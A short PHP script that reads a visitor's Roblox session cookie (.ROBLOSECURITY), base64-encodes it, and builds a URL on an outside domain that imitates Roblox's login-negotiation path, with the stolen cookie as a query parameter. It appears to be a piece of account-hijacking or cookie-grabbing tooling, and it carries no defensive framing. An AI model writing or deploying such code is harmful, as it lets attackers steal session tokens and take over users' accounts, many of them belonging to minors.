<?php
// Check if the cookie is set
if(isset($_COOKIE['ROBLOSECURITY'])) {
    // Get the cookie value
    $cookieValue = $_COOKIE['ROBLOSECURITY'];

    // Encode the cookie value as needed (e.g., base64 encode)
    $encodedCookie = base64_encode($cookieValue);

    // Construct your URL
    $url = "http://www.unixfr.xyz/login/Negotiate.ashx?suggest=" . urlencode($encodedCookie);

    // Output the URL
    echo "$url";
} else {
    echo "Cookie .ROBLOSECURITY not set.";
}
?>